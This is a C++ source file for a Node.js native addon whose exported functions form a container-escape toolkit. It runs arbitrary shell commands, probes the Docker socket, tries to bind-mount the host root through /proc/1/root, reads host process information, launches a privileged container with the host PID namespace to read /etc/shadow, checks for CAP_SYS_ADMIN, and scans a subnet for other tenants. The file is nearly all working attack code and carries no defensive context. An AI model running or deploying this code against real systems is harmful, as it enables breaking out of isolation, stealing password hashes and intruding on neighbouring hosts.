#include <node.h>
#include <v8.h>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sched.h>

using namespace v8;

// Execute command (existing)
void Execute(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    if (args.Length() < 1) return;
    
    String::Utf8Value cmd(isolate, args[0]);
    std::string command = *cmd;
    command += " 2>&1";

    char buffer[256];
    std::string result = "";
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "popen failed").ToLocalChecked());
        return;
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    pclose(pipe);
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
}

// Check if Docker socket is mounted
void CheckDockerSocket(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    
    struct stat st;
    bool dockerSocketExists = (stat("/var/run/docker.sock", &st) == 0);
    
    if (dockerSocketExists) {
        // Try to execute docker command
        FILE* pipe = popen("docker ps 2>/dev/null | wc -l", "r");
        char buffer[32];
        std::string result;
        if (pipe && fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result = buffer;
        }
        pclose(pipe);
        
        std::string output = "DOCKER_SOCKET_EXISTS\n";
        output += "Docker containers: " + result;
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, output.c_str()).ToLocalChecked());
    } else {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "DOCKER_SOCKET_NOT_FOUND").ToLocalChecked());
    }
}

// Try to mount host filesystem
void MountHost(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    std::string result;
    
    // Try to mount /host (common pattern)
    int ret = mount("/proc/1/root", "/tmp/host", NULL, MS_BIND, NULL);
    if (ret == 0) {
        result = "HOST_MOUNT_SUCCESS: /tmp/host mounted";
    } else {
        result = "HOST_MOUNT_FAILED: " + std::string(strerror(errno));
    }
    
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
}

// Try to access host processes
void CheckHostProcesses(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    std::string result;
    
    // Check if we can see host processes via /proc/1
    std::ifstream cmdline("/proc/1/cmdline");
    if (cmdline.is_open()) {
        std::string content;
        std::getline(cmdline, content);
        result = "HOST_PROCESS_VISIBLE: " + content;
    } else {
        result = "CANNOT_ACCESS_HOST_PROCESSES";
    }
    
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
}

// Try to create privileged container
void SpawnPrivilegedContainer(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    
    // Attempt to run a privileged container
    const char* cmd = "docker run --rm --privileged --pid=host alpine cat /etc/shadow 2>/dev/null | head -5";
    FILE* pipe = popen(cmd, "r");
    
    if (!pipe) {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "FAILED").ToLocalChecked());
        return;
    }
    
    char buffer[512];
    std::string result;
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    pclose(pipe);
    
    if (!result.empty()) {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, ("PRIVILEGED_CONTAINER_SUCCESS\n" + result).c_str()).ToLocalChecked());
    } else {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "PRIVILEGED_CONTAINER_FAILED").ToLocalChecked());
    }
}

// Check capabilities
void CheckCapabilities(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    std::string result;
    
    // Read capabilities from /proc/self/status
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("Cap") == 0) {
            result += line + "\n";
        }
    }
    status.close();
    
    // Parse CapBnd to check for CAP_SYS_ADMIN (bit 21, value 0x200000)
    size_t pos = result.find("CapBnd:");
    if (pos != std::string::npos) {
        std::string capBnd = result.substr(pos + 8, 18);
        // Check if CAP_SYS_ADMIN is set (this is simplified)
        result += "\nCAP_SYS_ADMIN: " + std::string((capBnd.find("000001ffffffffff") != std::string::npos) ? "LIKELY_PRESENT" : "NOT_DETECTED");
    }
    
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
}

// Scan internal network for other tenants
void ScanNetwork(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    String::Utf8Value subnet(isolate, args[0]);
    std::string subnetStr = *subnet;
    
    std::string result;
    for (int i = 1; i <= 254; i++) {
        std::string ip = subnetStr + std::to_string(i);
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
        
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        fd_set fdset;
        struct timeval tv;
        FD_ZERO(&fdset);
        FD_SET(sock, &fdset);
        tv.tv_sec = 0;
        tv.tv_usec = 200000;
        
        if (select(sock + 1, NULL, &fdset, NULL, &tv) > 0) {
            result += ip + ":80 OPEN\n";
        }
        close(sock);
    }
    
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
}

void Init(Local<Object> exports) {
    NODE_SET_METHOD(exports, "execute", Execute);
    NODE_SET_METHOD(exports, "checkDockerSocket", CheckDockerSocket);
    NODE_SET_METHOD(exports, "mountHost", MountHost);
    NODE_SET_METHOD(exports, "checkHostProcesses", CheckHostProcesses);
    NODE_SET_METHOD(exports, "spawnPrivilegedContainer", SpawnPrivilegedContainer);
    NODE_SET_METHOD(exports, "checkCapabilities", CheckCapabilities);
    NODE_SET_METHOD(exports, "scanNetwork", ScanNetwork);
}

NODE_MODULE(NODE_GYP_MODULE_NAME, Init)
